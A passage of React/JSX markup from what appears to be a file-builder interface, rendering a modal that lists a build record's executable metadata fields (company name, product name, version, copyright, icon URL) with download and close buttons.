                            <div>
                              <h4 className="font-semibold mb-1">{t('builder.metadata')}</h4>
                              <div className="text-default-600 space-y-0.5">
                                {selectedRecord.config.companyName && <div>{t('builder.companyName')}: {selectedRecord.config.companyName}</div>}
                                {selectedRecord.config.fileDescription && <div>{t('builder.fileDescription')}: {selectedRecord.config.fileDescription}</div>}
                                {selectedRecord.config.productName && <div>{t('builder.productName')}: {selectedRecord.config.productName}</div>}
                                {selectedRecord.config.copyright && <div>{t('builder.copyright')}: {selectedRecord.config.copyright}</div>}
                                {selectedRecord.config.fileVersion && <div>{t('builder.fileVersion')}: {selectedRecord.config.fileVersion}</div>}
                                {selectedRecord.config.iconUrl && <div className="truncate max-w-[300px]">{t('builder.icon')}: {selectedRecord.config.iconUrl}</div>}
                              </div>
                            </div>
                          )}
                        </div>
                      </>
                    )}
                  </div>
                ) : null}
              </Modal.Body>
              <Modal.Footer>
                {selectedRecord && selectedRecord.status === 'completed' && (
                  <Button variant="primary" onPress={() => handleDownload(selectedRecord.id)}>
                    {t('builder.download')}
                  </Button>
                )}
                <Button variant="ghost" onPress={() => setSelectedRecord(null)}>{t('common.close')}</Button>
              </Modal.Footer>
            </Modal.Dialog>
          </Modal.Container>
        </Modal.Backdrop>
    </div>
  );
}
